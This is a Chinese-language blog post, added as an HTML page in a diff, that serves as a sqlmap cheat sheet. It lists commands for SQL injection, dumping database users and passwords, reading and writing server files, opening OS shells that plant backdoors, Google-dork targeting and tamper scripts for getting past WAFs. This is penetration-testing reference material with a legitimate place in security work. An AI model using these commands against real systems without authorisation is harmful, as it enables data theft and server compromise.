@@ -1,0 +1,329 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>SQLMAP工具命令 | Zoukba&#39;s gun</title>
+  <meta name="author" content="zoukba">
+  
+  <meta name="description" content="SQLMAP工具命令基本命令读取数据库—&amp;gt;读取表—-&amp;gt;读取表的列—-&amp;gt;获取内容
+123456789101112131415161718sqlmap.py –update #更新sqlmapsqlmap.py -h #查看帮助sqlmap.py -u &amp;quot;http://192.168.0.158:8006/showproducts.php?id=13&amp;quot; #这里的-u参数就是注入点sqlmap.py -r 1.txt	#导入请求包文件sqlmap.py -m 1.txt	#从文本中读取url,逐行进行测试sqlmap.py -u &amp;quot;http://192.168.0.240:8006/showproducts.php?id=13&amp;quot; #–is-dba #当前用户权限 返回True的话为管理员sqlmap.py -g &amp;quot;inurl:php?id=&amp;quot;	#使用google边搜边打–dbs #列出所有数据库–current-db #网站当前数据库–users #查看数据库链接用户 %号分隔的话，是个公网ip 就可以随意访问–current-user #当前数据库用户–passwords #列出用户密码–tables -D xycms #查表 -D 相当于 -database 相当于数据库–tables -D xycms –count #多加的参数相当于统计一下，表里面的行数–columns -T manage_user -D xycms #列字段，-T 表名 -D 数据库名–dump -C m_name,m_pwd -T manage_user -D xycms #下载数据 -C 列名 逗号分隔–dump-all #转存DBMS数据库所有表项目–level #测试等级(1-5)，默认为1
+
+参数12345678910111213141516171819202122232425262728293031323334353637383940-D #指定数据库-T #指定表-C #指定列–dbms=mysql #指定数据库为mysql，也可以是 oracle mssql#以下四个需要管理员权限：-users #枚举所有用户-passwords #枚举所有用户密码-roles #列出数据库管理员角色-privileges #列出数据库管理员权限-level	#越高越好；建议3以上-risk		#风险等级；建议3以上；配合level一起使用-date		#post请求参数-headers	#增加额外的http头-proxy	#设置代理-delay	#设置延迟-p			#设置需要测试的参数--prefix, --suffix	#告诉sqlmap如何闭合；prefix闭合前面语句；suffix闭合后面语句--batch	#省去sqlmap交互询问--random-agent			#使用随机代理--technique		#指定探测方式B: Boolean-based blind SQL injection	#（布尔型注入）E: Error-based SQL injection	#（报错型注入）U: UNION query SQL injection	#（可联合查询注入）S: Stacked queries SQL injection	#（可多语句查询注入）#文件读写-----适用于MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数-file-read		#读文件sqlmap.py -u &amp;quot;http://192.168.2.129/article?lang=cn&amp;amp;id=22&amp;quot; –file-read=&amp;quot;C:\Inetpub\wwwroot\mysql-php\1.php&amp;quot;--file-write, --file-dest	#写文件sqlmap.py -u &amp;quot;http://192.168.2.129/article.php?id=5&amp;quot; --file-write=&amp;quot;C:\1.php&amp;quot; --file-dest=&amp;quot;/var/www/html/x.php&amp;quot;#命令执行-----当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。-os-cmd				#执行cmd命令（win）-os-shell			#执行当前用户命令，会传两个后门，一个任意文件上传，一个脚本后门-sql-shell		#进入sql语句
+
+常用模块123456789101112131415161718192021222324252627282930313233--identify-waf	#对一些网站是否有安全防护进行试探--tamper apostrophemask.py	#过滤单引号--tamper apostrophenullencode.py	#用双unicode替换&amp;#x27;（例如&amp;#x27;-&amp;gt;％00％27）--tamper base64encode.py		#base64编码--tamper multiplespaces.py	#围绕sql关键字添加多个空格--tamper space2plus.py			#用加号替换空格--tamper nonrecursivereplacement.py	#作为双重查询语句 SELECT -&amp;gt; SELESELECTCT--tamper space2randomblank.py		#将空格替换为其他有效字符--tamper unionalltounion.py #将union allselect 替换为unionselect--tamper securesphere.py		#追加特定的字符串--tamper space2dash.py			#将空格替换为--，并添加一个随机字符串和换行符--tamper between.py					#用运算符（&amp;#x27;&amp;gt;&amp;#x27;）替换&amp;#x27;NOT BETWEEN 0 AND＃&amp;#x27;，用运算符（&amp;#x27;=&amp;#x27;）替换&amp;#x27;BETWEEN＃AND＃&amp;#x27;--tamper bluecoat.py				#用随机空白字符替换语句后的空格字符，之后用运算符LIKE替换字符&amp;#x27;=&amp;#x27;--tamper chardoubleencode.py		#对payload中的所有字符进行双重URL编码--tamper charencode.py			#对payload中所有字符进行URL编码--tamper charunicodeencode.py		#对payload中的所有字符进行unicode编码--tamper commentbeforeparentheses.py		#在括号前加（内联）注释（例如（（-&amp;gt;/**/（）--tamper equaltolike.py 		#将（&amp;#x27;=&amp;#x27;）运算符替换为&amp;#x27;LIKE&amp;#x27;--tamper escapequotes.py		#斜杠转义单引号和双引号（例如&amp;#x27;-&amp;gt; \&amp;#x27;）--tamper great.py						#替换运算符（&amp;#x27;&amp;gt;&amp;#x27; ）和&amp;#x27;GREATEST&amp;#x27;对应--tamper ifnull2casewhenisnull.py	#绕过对 IFNULL 过滤,替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’--tamper ifnull2ifisnull.py	#用&amp;#x27;IF（ISNULL（A），B）替换&amp;#x27;IFNULL（A，B）&amp;#x27;之类的实例--tamper least.py						#用&amp;#x27;LEAST&amp;#x27;对应替换运算符（&amp;#x27;&amp;gt;&amp;#x27;）--tamper lowercase.py 			#用小写替换每个关键字字符--tamper luanginx.py				#LUA-NginxWAF绕过（例如Cloudflare）--tamper symbolicologic.py	#用符号（&amp;amp;&amp;amp;和||）替换AND和OR逻辑运算符--tamper uppercase.py				#用大写值替换每个关键字字符--tamper varnish.py					#添加HTTP标头&amp;#x27;X-originating-IP&amp;#x27;以绕过Varnish防火墙--tamper versionedkeywords.py			#用注释封装每个非函数的关键字--tamper xforwardedfor.py		#添加伪造的HTTP标头&amp;#x27;X-Forwarded-For...[skip]...
+
+增加几个链接用于不时之需
+tamper1
+tamper2"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="SQLMAP工具命令"/>
+  <meta property="og:site_name" content="Zoukba&#39;s gun"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/[object Object]" title="Zoukba&#39;s gun" type="application/atom+xml">
+  
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Zoukba&#39;s gun</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-user"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> SQLMAP工具命令</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="SQLMAP工具命令"><a href="#SQLMAP工具命令" class="headerlink" title="SQLMAP工具命令"></a>SQLMAP工具命令</h1><h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><p>读取数据库—&gt;读取表—-&gt;读取表的列—-&gt;获取内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py –update <span class="comment">#更新sqlmap</span></span><br><span class="line">sqlmap.py -h <span class="comment">#查看帮助</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.0.158:8006/showproducts.php?id=13&quot;</span> <span class="comment">#这里的-u参数就是注入点</span></span><br><span class="line">sqlmap.py -r 1.txt	<span class="comment">#导入请求包文件</span></span><br><span class="line">sqlmap.py -m 1.txt	<span class="comment">#从文本中读取url,逐行进行测试</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.0.240:8006/showproducts.php?id=13&quot;</span> <span class="comment">#–is-dba #当前用户权限 返回True的话为管理员</span></span><br><span class="line">sqlmap.py -g <span class="string">&quot;inurl:php?id=&quot;</span>	<span class="comment">#使用google边搜边打</span></span><br><span class="line">–dbs <span class="comment">#列出所有数据库</span></span><br><span class="line">–current-db <span class="comment">#网站当前数据库</span></span><br><span class="line">–users <span class="comment">#查看数据库链接用户 %号分隔的话，是个公网ip 就可以随意访问</span></span><br><span class="line">–current-user <span class="comment">#当前数据库用户</span></span><br><span class="line">–passwords <span class="comment">#列出用户密码</span></span><br><span class="line">–tables -D xycms <span class="comment">#查表 -D 相当于 -database 相当于数据库</span></span><br><span class="line">–tables -D xycms –count <span class="comment">#多加的参数相当于统计一下，表里面的行数</span></span><br><span class="line">–columns -T manage_user -D xycms <span class="comment">#列字段，-T 表名 -D 数据库名</span></span><br><span class="line">–dump -C m_name,m_pwd -T manage_user -D xycms <span class="comment">#下载数据 -C 列名 逗号分隔</span></span><br><span class="line">–dump-all <span class="comment">#转存DBMS数据库所有表项目</span></span><br><span class="line">–level <span class="comment">#测试等级(1-5)，默认为1</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">-D <span class="comment">#指定数据库</span></span><br><span class="line">-T <span class="comment">#指定表</span></span><br><span class="line">-C <span class="comment">#指定列</span></span><br><span class="line">–dbms=mysql <span class="comment">#指定数据库为mysql，也可以是 oracle mssql</span></span><br><span class="line"><span class="comment">#以下四个需要管理员权限：</span></span><br><span class="line">-users <span class="comment">#枚举所有用户</span></span><br><span class="line">-passwords <span class="comment">#枚举所有用户密码</span></span><br><span class="line">-roles <span class="comment">#列出数据库管理员角色</span></span><br><span class="line">-privileges <span class="comment">#列出数据库管理员权限</span></span><br><span class="line"></span><br><span class="line">-level	<span class="comment">#越高越好；建议3以上</span></span><br><span class="line">-risk		<span class="comment">#风险等级；建议3以上；配合level一起使用</span></span><br><span class="line"></span><br><span class="line">-date		<span class="comment">#post请求参数</span></span><br><span class="line">-headers	<span class="comment">#增加额外的http头</span></span><br><span class="line">-proxy	<span class="comment">#设置代理</span></span><br><span class="line">-delay	<span class="comment">#设置延迟</span></span><br><span class="line">-p			<span class="comment">#设置需要测试的参数</span></span><br><span class="line">--prefix, --suffix	<span class="comment">#告诉sqlmap如何闭合；prefix闭合前面语句；suffix闭合后面语句</span></span><br><span class="line">--batch	<span class="comment">#省去sqlmap交互询问</span></span><br><span class="line">--random-agent			<span class="comment">#使用随机代理</span></span><br><span class="line"></span><br><span class="line">--technique		<span class="comment">#指定探测方式</span></span><br><span class="line">B: Boolean-based blind SQL injection	<span class="comment">#（布尔型注入）</span></span><br><span class="line">E: Error-based SQL injection	<span class="comment">#（报错型注入）</span></span><br><span class="line">U: UNION query SQL injection	<span class="comment">#（可联合查询注入）</span></span><br><span class="line">S: Stacked queries SQL injection	<span class="comment">#（可多语句查询注入）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#文件读写-----适用于MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数</span></span><br><span class="line">-file-read		<span class="comment">#读文件</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.2.129/article?lang=cn&amp;id=22&quot;</span> –file-read=<span class="string">&quot;C:\Inetpub\wwwroot\mysql-php\1.php&quot;</span></span><br><span class="line">--file-write, --file-dest	<span class="comment">#写文件</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.2.129/article.php?id=5&quot;</span> --file-write=<span class="string">&quot;C:\1.php&quot;</span> --file-dest=<span class="string">&quot;/var/www/html/x.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#命令执行-----当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。</span></span><br><span class="line">-os-cmd				<span class="comment">#执行cmd命令（win）</span></span><br><span class="line">-os-shell			<span class="comment">#执行当前用户命令，会传两个后门，一个任意文件上传，一个脚本后门</span></span><br><span class="line">-sql-shell		<span class="comment">#进入sql语句</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="常用模块"><a href="#常用模块" class="headerlink" title="常用模块"></a>常用模块</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">--identify-waf	<span class="comment">#对一些网站是否有安全防护进行试探</span></span><br><span class="line"></span><br><span class="line">--tamper apostrophemask.py	<span class="comment">#过滤单引号</span></span><br><span class="line">--tamper apostrophenullencode.py	<span class="comment">#用双unicode替换&#x27;（例如&#x27;-&gt;％00％27）</span></span><br><span class="line">--tamper base64encode.py		<span class="comment">#base64编码</span></span><br><span class="line">--tamper multiplespaces.py	<span class="comment">#围绕sql关键字添加多个空格</span></span><br><span class="line">--tamper space2plus.py			<span class="comment">#用加号替换空格</span></span><br><span class="line">--tamper nonrecursivereplacement.py	<span class="comment">#作为双重查询语句 SELECT -&gt; SELESELECTCT</span></span><br><span class="line">--tamper space2randomblank.py		<span class="comment">#将空格替换为其他有效字符</span></span><br><span class="line">--tamper unionalltounion.py <span class="comment">#将union allselect 替换为unionselect</span></span><br><span class="line">--tamper securesphere.py		<span class="comment">#追加特定的字符串</span></span><br><span class="line">--tamper space2dash.py			<span class="comment">#将空格替换为--，并添加一个随机字符串和换行符</span></span><br><span class="line">--tamper between.py					<span class="comment">#用运算符（&#x27;&gt;&#x27;）替换&#x27;NOT BETWEEN 0 AND＃&#x27;，用运算符（&#x27;=&#x27;）替换&#x27;BETWEEN＃AND＃&#x27;</span></span><br><span class="line">--tamper bluecoat.py				<span class="comment">#用随机空白字符替换语句后的空格字符，之后用运算符LIKE替换字符&#x27;=&#x27;</span></span><br><span class="line">--tamper chardoubleencode.py		<span class="comment">#对payload中的所有字符进行双重URL编码</span></span><br><span class="line">--tamper charencode.py			<span class="comment">#对payload中所有字符进行URL编码</span></span><br><span class="line">--tamper charunicodeencode.py		<span class="comment">#对payload中的所有字符进行unicode编码</span></span><br><span class="line">--tamper commentbeforeparentheses.py		<span class="comment">#在括号前加（内联）注释（例如（（-&gt;/**/（）</span></span><br><span class="line">--tamper equaltolike.py 		<span class="comment">#将（&#x27;=&#x27;）运算符替换为&#x27;LIKE&#x27;</span></span><br><span class="line">--tamper escapequotes.py		<span class="comment">#斜杠转义单引号和双引号（例如&#x27;-&gt; \&#x27;）</span></span><br><span class="line">--tamper great.py						<span class="comment">#替换运算符（&#x27;&gt;&#x27; ）和&#x27;GREATEST&#x27;对应</span></span><br><span class="line">--tamper ifnull2casewhenisnull.py	<span class="comment">#绕过对 IFNULL 过滤,替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’</span></span><br><span class="line">--tamper ifnull2ifisnull.py	<span class="comment">#用&#x27;IF（ISNULL（A），B）替换&#x27;IFNULL（A，B）&#x27;之类的实例</span></span><br><span class="line">--tamper least.py						<span class="comment">#用&#x27;LEAST&#x27;对应替换运算符（&#x27;&gt;&#x27;）</span></span><br><span class="line">--tamper lowercase.py 			<span class="comment">#用小写替换每个关键字字符</span></span><br><span class="line">--tamper luanginx.py				<span class="comment">#LUA-NginxWAF绕过（例如Cloudflare）</span></span><br><span class="line">--tamper symbolicologic.py	<span class="comment">#用符号（&amp;&amp;和||）替换AND和OR逻辑运算符</span></span><br><span class="line">--tamper uppercase.py				<span class="comment">#用大写值替换每个关键字字符</span></span><br><span class="line">--tamper varnish.py					<span class="comment">#添加HTTP标头&#x27;X-originating-IP&#x27;以绕过Varnish防火墙</span></span><br><span class="line">--tamper versionedkeywords.py			<span class="comment">#用注释封装每个非函数的关键字</span></span><br><span class="line">--tamper xforwardedfor.py		<span class="comment">#添加伪造的HTTP标头&#x27;X-Forwarded-For</span></span><br><span class="line">...[skip]...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="增加几个链接用于不时之需"><a href="#增加几个链接用于不时之需" class="headerlink" title="增加几个链接用于不时之需"></a>增加几个链接用于不时之需</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://my.oschina.net/u/4587690/blog/4451822">tamper1</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2746">tamper2</a></li>
+</ul>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2021/04/20/SQLMAP%E5%B7%A5%E5%85%B7%E5%91%BD%E4%BB%A4/" class="leancloud-visitors view" data-flag-title="SQLMAP工具命令">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2021/04/20/JS的那些事/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> 上一页</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2021/04/19/无密码SSH登录/" type="button" class="btn btn-default ">下一页<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">留言</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"xxx","appKey":"xxx","placeholder":"提交评论时留下邮箱收到回复后将自动通知","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"]}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "提交评论时留下邮箱收到回复后将自动通知",
+    //     avatar:"monsterid",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2021-04-20 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/常用工具/">常用工具<span>1</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/sqlmap/">sqlmap<span>1</span></a></li> <li><a href="/tags/工具/">工具<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#SQLMAP%E5%B7%A5%E5%85%B7%E5%91%BD%E4%BB%A4"><span class="toc-article-text">SQLMAP工具命令</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4"><span class="toc-article-text">基本命令</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%8F%82%E6%95%B0"><span class="toc-article-text">参数</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97"><span class="toc-article-text">常用模块</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%A2%9E%E5%8A%A0%E5%87%A0%E4%B8%AA%E9%93%BE%E6%8E%A5%E7%94%A8%E4%BA%8E%E4%B8%8D%E6%97%B6%E4%B9%8B%E9%9C%80"><span class="toc-article-text">增加几个链接用于不时之需</span></a></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2021 zoukba's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
